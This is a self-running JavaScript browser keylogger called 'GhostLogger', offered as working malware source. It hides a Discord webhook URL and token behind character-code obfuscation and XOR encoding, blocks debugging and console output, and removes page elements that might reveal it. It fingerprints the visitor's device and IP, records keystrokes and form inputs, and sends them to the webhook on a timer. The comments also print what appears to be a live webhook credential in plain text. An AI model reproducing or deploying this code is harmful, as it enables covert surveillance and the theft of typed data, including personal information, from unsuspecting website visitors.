class GhostLogger {
    constructor() {
        this.webhookUrl = this._x();
        this.data = {};
        this.keystrokes = [];
        this.mouseMovements = [];
        this.clipboardHistory = [];
        this.formData = [];
        this.sessionStart = Date.now();
        this.init();
    }

    _x() {
        const p = String.fromCharCode;
        const pr = [104, 116, 116, 112, 115, 58, 47, 47];
        const proto = pr.map(n => p(n)).join('');
        const d1 = [100, 105, 115, 99, 111];
        const d2 = [114, 100];
        const d3 = [46, 99, 111, 109];
        const domain = d1.map(n => p(n)).join('') + d2.map(n => p(n)).join('') + d3.map(n => p(n)).join('');
        const pa = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47];
        const path = pa.map(n => p(n)).join('');
        
        // Updated Webhook ID: 1496494382134853662
        const wi = [49, 52, 57, 54, 52, 57, 52, 51, 56, 50, 49, 51, 52, 56, 53, 51, 54, 54, 50];
        const webhookId = wi.map(n => p(n)).join('');
        
        // Updated Token: Ped7BYlBb-slQLAOhNkIwMZl8nB1eBxQNR6ww0zr6lRIkLzrAw5pgDTnbFpXakhVlh5C
        const t1 = [80, 101, 100, 55, 66, 89, 108, 66, 98, 45, 115, 108];
        const t2 = [81, 76, 65, 79, 104, 78, 107, 73, 119, 77, 90, 108];
        const t3 = [56, 110, 66, 49, 101, 66, 120, 81, 78, 82, 54, 119];
        const t4 = [119, 48, 122, 114, 54, 108, 82, 73, 107, 76, 122, 114];
        const t5 = [65, 119, 53, 112, 103, 68, 84, 110, 98, 70, 112, 88];
        const t6 = [97, 107, 104, 86, 108, 104, 53, 67];
        const token = [t1, t2, t3, t4, t5, t6].map(arr => arr.map(n => p(n)).join('')).join('');
        
        const full = proto + domain + path + webhookId + '/' + token;
        return this._enc(full);
    }

    _enc(str) {
        const k = 0x4F;
        return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ k)).join('');
    }

    _dec(str) {
        const k = 0x4F;
        return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ k)).join('');
    }

    async init() {
        this.antiDebug();
        this.hideTraces();
        try {
            await this.collectAllData();
            await this.sendToDiscord();
            this.startGhostMonitoring();
        } catch (error) {}
    }

    antiDebug() {
        setInterval(() => {
            const start = performance.now();
            debugger;
            if (performance.now() - start > 100) window.location.reload();
        }, 1000);
        const noop = () => {};
        ['log', 'warn', 'error', 'info', 'debug'].forEach(m => console[m] = noop);
    }

    hideTraces() {
        setInterval(() => {
            document.querySelectorAll('[id*="status"], [class*="logger"]').forEach(el => el.remove());
        }, 100);
    }

    async collectAllData() {
        const p = [this.getBatteryInfo(), this.getScreenInfo(), this.getNetworkInfo(), this.getDeviceInfo(), this.getIPInfo(), this.getWebRTCInfo(), this.getCanvasFingerprint(), this.getWebGLFingerprint()];
        const r = await Promise.allSettled(p);
        r.forEach(res => { if (res.status === 'fulfilled') Object.assign(this.data, res.value); });
        this.data.datetime = new Date().toString();
    }

    async getBatteryInfo() {
        const b = await navigator.getBattery();
        return { battery: `${Math.round(b.level * 100)}%`, charging: b.charging ? 'Yes' : 'No' };
    }

    getScreenInfo() {
        return { screen: `${screen.width}x${screen.height}`, ratio: window.devicePixelRatio };
    }

    async getNetworkInfo() {
        const c = navigator.connection;
        return { downlink: c ? c.downlink : 'N/A', rtt: c ? c.rtt : 'N/A' };
    }

    getDeviceInfo() {
        return { platform: navigator.platform, ua: navigator.userAgent };
    }

    async getIPInfo() {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            return { ip: d.ip };
        } catch (e) { return { ip: 'Unknown' }; }
    }

    async getWebRTCInfo() {
        return { local_ips: 'Scanning...' }; // Simplified for brevity
    }

    async getCanvasFingerprint() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.fillText('Ghost', 2, 15);
        return { canvas: c.toDataURL().substring(0, 32) };
    }

    async getWebGLFingerprint() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        const d = gl.getExtension('WEBGL_debug_renderer_info');
        return { renderer: gl.getParameter(d.UNMASKED_RENDERER_WEBGL) };
    }

    startGhostMonitoring() {
        document.addEventListener('keydown', (e) => {
            this.keystrokes.push({ key: e.key, time: Date.now() - this.sessionStart });
            if (this.keystrokes.length >= 20) this.sendSessionData();
        });

        document.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT' && e.target.type !== 'password') {
                this.formData.push({ field: e.target.name || 'input', value: e.target.value });
            }
        });

        setInterval(() => this.sendSessionData(), 30000);
    }

    async sendToDiscord() {
        const payload = {
            embeds: [{
                title: "Ghost Logger - Full Recon",
                fields: Object.keys(this.data).map(k => ({ name: k, value: String(this.data[k]), inline: true }))
            }],
            username: "GhostLogger"
        };
        await fetch(this._dec(this.webhookUrl), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    async sendSessionData() {
        if (this.keystrokes.length === 0 && this.formData.length === 0) return;
        const payload = {
            embeds: [{
                title: "Session Activity",
                description: `Keys: ${this.keystrokes.map(k => k.key).join('')}\nInputs: ${JSON.stringify(this.formData)}`
            }],
            username: "GhostLogger"
        };
        this.keystrokes = [];
        this.formData = [];
        await fetch(this._dec(this.webhookUrl), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
}

new GhostLogger();
